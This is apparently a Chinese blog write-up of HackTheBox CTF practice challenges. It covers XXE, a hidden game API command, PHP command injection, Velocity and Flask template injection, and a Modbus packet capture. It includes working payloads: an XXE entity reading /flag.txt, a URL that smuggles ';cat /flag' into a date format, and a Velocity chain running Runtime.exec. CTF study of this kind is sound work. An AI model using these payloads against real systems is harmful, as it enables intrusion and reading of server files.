---
title: "HTB-CTF Try Out分析与题解"
description: "HTB-CTF是HackTheBox发起的一个CTF比赛，题目覆盖了多个领域，包括WEB、MOBILE、CRYPTO、REVERSE等。"
date: "2025-08-30"
tags:
  - "HTB"
  - "CTF"
  - "WEB"
  - "XXE"
authors:
  - "bx"
draft: false              # 设为 true 则为草稿
slug: "htb-ctf"          # 随机URL字符串
---
<meta name="referrer" content="no-referrer">

# HTB-CTF Try Out分析与题解

> 比赛地址：
>
> https://ctf.hackthebox.com/event/1434

## WEB

### Jailbreak 越狱

> The crew secures an experimental Pip-Boy from a black market merchant, recognizing its potential to unlock the heavily guarded bunker of Vault 79. Back at their hideout, the hackers and engineers collaborate to jailbreak the device, working meticulously to bypass its sophisticated biometric locks. Using custom firmware and a series of precise modifications, can you bring the device to full operational status in order to pair it with the vault door's access port. The flag is located in /flag.txt
> 队伍从黑市商人那里获得了一台实验性的皮普男孩，意识到它有可能解锁 Vault 79 这个严密防守的地下掩体。回到他们的藏身之处，黑客和工程师们合作越狱这个设备，小心翼翼地绕过其复杂的生物识别锁。使用自定义固件和一系列精确的修改，你能将设备恢复到完全运行状态，以便与保险库门的访问端口配对吗。标志位于/flag.txt

进入题目发现想一个游戏

来回看看发现一个xml更新的页面，可以更改数据

![](https://raw.githubusercontent.com/bx33661/Picgo/main/20250830230228844.png)

尝试一下XXE

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///flag"> ]> <root> <name>&xxe;</name> </root>
```

但是要求必须是`An error occurred: The root element must be 'FirmwareUpdateConfig'.`

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<FirmwareUpdateConfig>
  <Firmware>
    <Version>1.0</Version>
    <name>&xxe;</name>
  </Firmware>
</FirmwareUpdateConfig>

```

但是几次测试观察一下来，这个版本是一个变量输出

![image-20250830214238440](https://raw.githubusercontent.com/bx33661/Picgo/main/20250830230231582.png)

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<FirmwareUpdateConfig>
  <Firmware>
    <Version>&xxe;</Version>
    <name>&xxe;</name>
  </Firmware>
</FirmwareUpdateConfig>

```

成功是XXE注入，最后得到flag

![image-20250830214513005](https://raw.githubusercontent.com/bx33661/Picgo/main/20250830230307320.png)



### Flag Command

> Embark on the "Dimensional Escape Quest" where you wake up in a mysterious forest maze that's not quite of this world. Navigate singing squirrels, mischievous nymphs, and grumpy wizards in a whimsical labyrinth that may lead to otherworldly surprises. Will you conquer the enchanted maze or find yourself lost in a different dimension of magical challenges? The journey unfolds in this mystical escape!
> 踏上"维度逃脱大冒险"，你醒来在一个神秘森林迷宫中，这里似乎不属于这个世界。在充满奇幻的迷宫里，你需要引导会唱歌的松鼠、淘气的仙子，以及脾气古怪的巫师。这个奇妙的迷宫可能会带你去往另一个世界，带来意想不到的惊喜。你能否征服这个魔法迷宫，还是会在魔法挑战的另一个维度中迷失？这场神秘的逃脱之旅就此展开！

进来按照他的指令随便测试并没有发现什么

![image-20250830215143029](https://raw.githubusercontent.com/bx33661/Picgo/main/20250830230235562.png)

具体看一下前端代码

```javascript
export const START = 'YOU WAKE UP IN A FOREST.';

export const INITIAL_OPTIONS = [
    '<span class="command">You have 4 options!</span>',
    'HEAD NORTH',
    'HEAD SOUTH',
    'HEAD EAST',
    'HEAD WEST'
];

export const GAME_LOST =  'You <span class="command error">died</span> and couldn\'t escape the forest. Press <span class="command error">restart</span> to try again.';

export const GAME_WON = 'You <span class="command success">escaped</span> the forest and <span class="command success">won</span> the game! Congratulations! Press <span class="command success">restart</span> to play again.';

export const INFO = [
    "You abruptly find yourself lucid in the middle of a bizarre, alien forest.",
    "How the hell did you end up here?",
    "Eerie, indistinguishable sounds ripple through the gnarled trees, setting the hairs on your neck on edge.",
    "Glancing around, you spot a gangly, grinning figure lurking in the shadows, muttering 'Xclow3n' like some sort of deranged mantra, clearly waiting for you to pass out or something. Creepy much?",
    "Heads up! This forest isn't your grandmother's backyard.",
    "It's packed with enough freaks and frights to make a horror movie blush. Time to find your way out.",
    "The stakes? Oh, nothing big. Just your friends, plunged into an abyss of darkness and despair.",
    "Punch in 'start' to kick things off in this twisted adventure!"
];

export const CONTROLS = [
    "Use the <span class='command'>arrow</span> keys to traverse commands in the command history.",
    "Use the <span class='command'>enter</span> key to submit a command.",
];

export const HELP = [
    '<span class="command help">start</span> Start the game',
    '<span class="command help">clear</span> Clear the game screen',
    '<span class="command help">audio</span> Toggle audio on/off',
    '<span class="command help">restart</span> Restart the game',
    '<span class="command help">info</span> Show info about the game',
];

```

并没有什么成果

最后发现重点在于`main.js`中最后一个api端点

```js
const fetchOptions = () => {
    fetch('/api/options')
        .then((data) => data.json())
        .then((res) => {
            availableOptions = res.allPossibleCommands;

        })
        .catch(() => {
            availableOptions = undefined;
        })
}
```

![image-20250830220107950](https://raw.githubusercontent.com/bx33661/Picgo/main/20250830230240419.png)

发现这个secret命令

```
Blip-blop, in a pickle with a hiccup! Shmiggity-shmack
```

直接post传json得到结果

![image-20250830220704028](https://raw.githubusercontent.com/bx33661/Picgo/main/20250830230238564.png)



### TimeKORP

> Are you ready to unravel the mysteries and expose the truth hidden within KROP's digital domain? Join the challenge and prove your prowess in the world of cybersecurity. Remember, time is money, but in this case, the rewards may be far greater than you imagine.
> 你准备好揭开 KROP 数字领域中的谜团，揭露隐藏的真相了吗？加入挑战，证明你在网络安全领域的实力。记住，时间就是金钱，但在这个情况下，回报可能远比你想象的要大得多。

就是代码审计

漏洞点在于对于传入参数没有处理，最后到了危险函数执行中去

![image-20250830223528608](https://raw.githubusercontent.com/bx33661/Picgo/main/20250830230245130.png)

```php
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->command = "date '+" . $format . "' 2>&1";
    }

    public function getTime()
    {
        $time = exec($this->command);
        $res  = isset($time) ? $time : '?';
        return $res;
    }
}
```

最终Payload如下

```
http://94.237.50.221:31205/?format=%H:%M:%S%27;cat%20/flag;echo%20%27
```

得到flag



### Labyrinth Linguist 迷宫语言学家

> You and your faction find yourselves cornered in a refuge corridor inside a maze while being chased by a KORP mutant exterminator. While planning your next move you come across a translator device left by previous Fray competitors, it is used for translating english to voxalith, an ancient language spoken by the civilization that originally built the maze. It is known that voxalith was also spoken by the guardians of the maze that were once benign but then were turned against humans by a corrupting agent KORP devised. You need to reverse engineer the device in order to make contact with the mutant and claim your last chance to make it out alive.
> 你和你的阵营被困在一个迷宫内的避难走廊中，同时被 KORP 变异清除者追击。在计划下一步行动时，你们发现了一个由之前的 Fray 竞争者留下的翻译设备，它用于将英语翻译成伏斯利特语，这是一种由最初建造迷宫的文明所使用的古老语言。众所周知，伏斯利特语也曾是迷宫守护者的语言，他们原本是善良的，但后来被 KORP 设计的一种腐蚀性物质所改变，从而转而对抗人类。你需要逆向工程这个设备，以便与变异体取得联系，并抓住你最后的机会活下来。

代码审计，先判断一下是一个spring 项目,重点在于

```xml
<dependency>
    <groupId>org.apache.velocity</groupId>
    <artifactId>velocity</artifactId>
    <version>1.7</version>
</dependency>
```

查到一个对应版本的

```java
@RequestMapping("/")
@ResponseBody
String index(@RequestParam(required = false, name = "text") String textString) {
    if (textString == null) {
        textString = "Example text";
    }

    String template = "";

    try {
        template = readFileToString("/app/src/main/resources/templates/index.html", textString);
    } catch (IOException e) {
        e.printStackTrace();
    }

    RuntimeServices runtimeServices = RuntimeSingleton.getRuntimeServices();
    StringReader reader = new StringReader(template);

    org.apache.velocity.Template t = new org.apache.velocity.Template();
    t.setRuntimeServices(runtimeServices);
    try {
        t.setData(runtimeServices.parse(reader, "home"));
        t.initDocument();
        VelocityContext context = new VelocityContext();
        context.put("name", "World");

        StringWriter writer = new StringWriter();
        t.merge(context, writer);
        template = writer.toString();
    } catch (ParseException e) {
        e.printStackTrace();
    }

    return template;
}
```

使用 Velocity 引擎解析模板：

```java
RuntimeServices runtimeServices = RuntimeSingleton.getRuntimeServices();
StringReader reader = new StringReader(template);
t.setData(runtimeServices.parse(reader, "home"));
```

没有做任何过滤，可以执行语法

https://juejin.cn/post/7246777406386929721

但是具体模板注入语法参考一个外国人博客

https://antgarsil.github.io/posts/velocity/

```
text=#set ($run=1 + 1) $run 
```

![image-20250831105644823](https://raw.githubusercontent.com/bx33661/Picgo/main/20250831114832588.png)

执行成功输出2，我们继续命令执行

```java
#set($x='')##
#set($str=$x.class.forName("java.lang.String"))##
#set($chr=$x.class.forName("java.lang.Character"))##
#set($ex=$x.class.forName("java.lang.Runtime").getRuntime().exec('cat /flag.txt'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

这个关于这个Java的模板注入后续还得深入学习一下





### Guild 公会

> Welcome to the Guild ! But please wait until our Guild Master verify you. Thanks for the wait
> 欢迎加入公会！但请耐心等待公会大师验证您。感谢您的等待

这道题有点难操作很费时间，但也是ssti，我们分析一下漏洞点

```py
@views.route("/verify",methods=["GET", "POST"])
@login_required
def verify():
    if current_user.username == "admin":
        if request.method == "POST":
            user_id = request.form.get("user_id")
            verf_id = request.form.get("verification_id")
            query = Verification.query.filter_by(id=verf_id).first()
            
            img = Image.open(query.doc)

            exif_table={}

            for k, v in img.getexif().items():
                tag = TAGS.get(k)
                exif_table[tag]=v

            if "Artist" in exif_table.keys():
                sec_code = exif_table["Artist"]
                query.verified = 1
                db.session.commit()
                return render_template_string("Verified! {}".format(sec_code))
            else:
                return render_template_string("Not Verified! :(")
    else:
        flash("Oops", category="error")
        return redirect(url_for("views.home"))
```

`sec_code` 这个参数我们可以利用[ExifTool](https://exiftool.org/) 工具来写入，最后实现了一个ssti，不过Payload构造还是很麻烦的

## ICS

> 在 CTF（Capture The Flag）比赛中，**ICS** 通常指的是 **Industrial Control Systems（工业控制系统）**。这种类型的挑战涉及到模拟和渗透测试工业环境中的系统，特别是那些用于监控和控制工业设备的系统。

### Shush Protocol 嘘协议

> The crew sets their sights on an abandoned fertilizer plant, a desolate structure rumored to hold a cache of ammonium nitrate—crucial for their makeshift explosives. Navigating through the plant’s crumbling corridors, they reach the main control room where a dusty, outdated PLC still hums faintly with power. The crew's hackers spring into action, connecting their equipment to the network of the PLC and starting the process of extracting data. They know that finding the password the control device uses to connect to the PLC is key to gaining full access to it. The hackers deploy network enumeration tools to scan for active devices on the plant's internal network. They meticulously sift through IP addresses, looking for clues that might reveal the password. After several tense hours, they pinpoint the device—a ruggedized industrial computer buried under layers of dust, still linked to the PLC that performs certain diagnostic operations under a custom protocol on a specific interval. Having captured the traffic from that connection the only thing that remains is to locate the packet that contains the secret information.
> 队伍将目标锁定在一座废弃的化肥厂，这座荒凉的建筑物据说藏有硝酸铵——这对他们自制的炸药至关重要。他们穿过工厂破败的走廊，来到主控制室，那里有一台布满灰尘、过时的 PLC 仍然微弱地嗡嗡作响。队伍的黑客们迅速行动起来，将设备连接到 PLC 的网络，开始提取数据的过程。他们知道，找到控制设备用来连接 PLC 的密码是获得完全访问权限的关键。黑客们部署了网络枚举工具来扫描工厂内部网络上的活动设备。他们仔细筛选 IP 地址，寻找可能揭示密码的线索。经过几个紧张的小时，他们锁定了设备——一台坚固的工业计算机，被层层灰尘掩埋，仍然与 PLC 相连，该 PLC 在特定间隔内通过自定义协议执行某些诊断操作。捕获了该连接的流量后，唯一剩下的就是找到包含秘密信息的那个数据包。

![image-20250830224133988](https://raw.githubusercontent.com/bx33661/Picgo/main/20250830230247571.png)

这个其实简单利用wireshark分组字节流搜索就能找到flag

![image-20250830223815009](https://raw.githubusercontent.com/bx33661/Picgo/main/20250830230251795.png)

这里深入了解了一下

ICS主要考察自定义协议的一些东西，这里使用的是Modbus

Modbus/TCP 是一种工业控制系统中常用的通信协议，特别是在 PLC（可编程逻辑控制器） 和其他工业设备中。它通过 TCP/IP 网络进行通信，通常用于获取设备的状态或控制设备。

功能代码（Function Code）：

- 在 Modbus 协议中，功能代码用于定义所执行的操作（例如读取寄存器、写入寄存器等）。

- 你看到的 `Unknown function (102)` 表示该功能代码（102）在标准 Modbus 协议中没有定义，因此可能是设备厂商自定义的功能，或者是设备出现了不正常的响应。